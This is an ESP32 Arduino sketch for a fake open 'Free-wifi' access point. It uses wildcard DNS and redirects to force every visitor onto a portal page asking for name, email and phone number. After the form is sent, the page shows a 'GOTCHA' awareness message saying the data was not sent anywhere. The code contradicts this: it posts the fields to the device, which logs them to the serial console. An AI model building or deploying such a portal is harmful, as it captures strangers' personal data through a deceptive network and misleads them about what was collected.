#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

const char* wifiAP = "Free-wifi";
const char* wifiAPpass = "";
IPAddress local_IP(192,168,0,4);
WebServer webServer(80);
DNSServer dnsServer;


String getHostFromRequest(){
  if (webServer.hasHeader("Host")) return webServer.header("Host");
  return String("");
}


void handleRoot(){
 String html = R"rawliteral(<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width,initial-scale=1" />

    <title>Free Wi-Fi</title>

    <style>
      * {
        box-sizing: border-box;
      }
      body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
          Helvetica, Arial, sans-serif;
        padding: 20px;
        background: #eef2f5;
        color: #333;
        display: flex;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        margin: 0;
      }
      .card {
        background: white;
        padding: 40px;
        border-radius: 12px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        width: 100%;
        max-width: 480px;
        margin: auto;
        transition: transform 0.2s;
      }
      h2,
      h3 {
        margin-top: 0;
        color: #1a73e8;
      }
      p {
        line-height: 1.5;
        margin-bottom: 20px;
      }
      input {
        font-size: 16px;
        padding: 12px;
        margin-top: 10px;
        width: 100%;
        border: 1px solid #ddd;
        border-radius: 6px;
        transition: border-color 0.2s;
        outline: none;
      }
      input:focus {
        border-color: #1a73e8;
      }
      #sendBtn {
        font-size: 16px;
        font-weight: bold;
        padding: 14px;
        margin-top: 20px;
        width: 100%;
        cursor: pointer;
        background-color: #1a73e8;
        color: white;
        border: none;
        border-radius: 6px;
        transition: background-color 0.2s;
      }
      #sendBtn:hover {
        background-color: #1557b0;
      }
      .muted {
        color: #666;
        font-size: 14px;
      }
      .hidden {
        display: none;
      }
      
      #phase2 {
        text-align: center;
        animation: fadeIn 0.5s;
      }
      
      .prank-header {
        color: #d93025 !important;
        font-size: 28px;
        text-transform: uppercase;
        border-bottom: 2px dashed #d93025;
        padding-bottom: 10px;
        margin-bottom: 20px;
      }

      .funny-text {
        font-size: 18px;
        font-weight: bold;
        color: #333;
        margin: 20px 0;
      }

      .shake-card {
        animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
      }

      @keyframes shake {
        10%, 90% { transform: translate3d(-1px, 0, 0); }
        20%, 80% { transform: translate3d(2px, 0, 0); }
        30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
        40%, 60% { transform: translate3d(4px, 0, 0); }
      }

      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: scale(0.9);
        }
        to {
          opacity: 1;
          transform: scale(1);
        }
      }
    </style>
  </head>
  <body>
    <div class="card" id="mainCard">
      <div id="phase1">
        <h2>Free Wi-Fi</h2>

        <p class="muted">
          To use the free WiFi, you should enter
          <strong>correct details.</strong>
        </p>
        <p>Please enter your details.</p>
        <!-- Action is technically not needed for AJAX, but kept for structure -->
        <form id="wifiForm" action="/submit" method="POST">
          <input
            type="text"
            id="name"
            name="name"
            placeholder="Enter your name (e.g John Doe)"
          />
          <input
            type="email"
            id="email"
            name="email"
            placeholder="Enter your email (e.g johndoe@mail.com)"
          />
          <input
            type="tel"
            id="phone"
            name="phone"
            placeholder="Enter phone number (e.g. 9999999999)"
          />
          <input type="submit" value="Connect Now" id="sendBtn">
        </form>
      </div>

      <div id="phase2" class="hidden">
        <h2 class="prank-header">⚠️ GOTCHA! ⚠️</h2>
        
        <div class="funny-text">
          <p>Downloading your browser history...</p>
          <p>Uploading to Social Media...</p>
          <p>Ordering 50 Pizzas...</p>
        </div>
        
        <h3 style="color: #1a73e8; margin-top: 30px;">Just Kidding! 😂</h3>
        <p class="muted">But seriously, look how easy that was.</p>

        <h3>Security Alert</h3>

        <p>
          You just typed your personal info into a fake form. Cybercriminals set up
          "Free Wi-Fi" spots exactly like this to steal identities.
          <strong>Never trust open networks!</strong>
        </p>

        <p
          class="muted"
          style="
            border-top: 1px solid #eee;
            padding-top: 15px;
            margin-top: 20px;
          "
        >
          This was a demo. Your data was not actually sent anywhere.
        </p>
      </div>
    </div>

    <script>
      const phoneInput = document.getElementById("phone");
      const nameInput = document.getElementById("name");
      const emailInput = document.getElementById("email");
      const sendBtn = document.getElementById("sendBtn");
      const phase1 = document.getElementById("phase1");
      const phase2 = document.getElementById("phase2");
      const mainCard = document.getElementById("mainCard");

      sendBtn.addEventListener("click", function (e) {
        e.preventDefault();

        const phone = phoneInput.value.trim();
        const name = nameInput.value.trim();
        const email = emailInput.value.trim();

        if (!phone || !email || !name) {
          alert("Come on, at least try to fake the details! (Fill all fields)");
          return;
        }

        const formData = new URLSearchParams();
        formData.append("name", name);
        formData.append("email", email);
        formData.append("phone", phone);

        fetch("/submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: formData.toString()
        }).then(response => {
          console.log("Data sent successfully");
        }).catch(error => {
          console.error("Error:", error);
        });

        phase1.classList.add("hidden");
        mainCard.classList.add("shake-card"); 
        phase2.classList.remove("hidden");
      });
    </script>
  </body>
</html>)rawliteral";
 webServer.send(200, "text/html; charset=utf-8", html);
}

void handleSubmit(){
  if(webServer.method() == HTTP_POST){
    String name = webServer.arg("name");
    String email = webServer.arg("email");
    String phone = webServer.arg("phone");

    Serial.println("======== Data Received ========");
    Serial.println("Name: " + name);
    Serial.println("Email: "+ email);
    Serial.println("Phone: " + phone);
    Serial.println("===============================");

    webServer.send(200, "text/plain", "Data Received");
  }
  else {
    webServer.send(405, "text/plain", "Method Not Allowed");
  }
}

void handleNotFound() {
 String host = getHostFromRequest();
 webServer.sendHeader("Location", String("http://") + local_IP.toString() + "/", true);
 webServer.send(302, "text/plain", "");
}


void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(local_IP, local_IP,IPAddress(255,255,255,0));
  WiFi.softAP(wifiAP);

  Serial.println("AP Started: " + String(wifiAP));
  Serial.println("AP IP: " + local_IP.toString());

  dnsServer.start(53, "*" , local_IP);

  webServer.on("/", handleRoot);
  webServer.on("/submit", HTTP_POST, handleSubmit);
  webServer.onNotFound(handleNotFound);
  webServer.begin();

  Serial.println("Web Server Started.");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}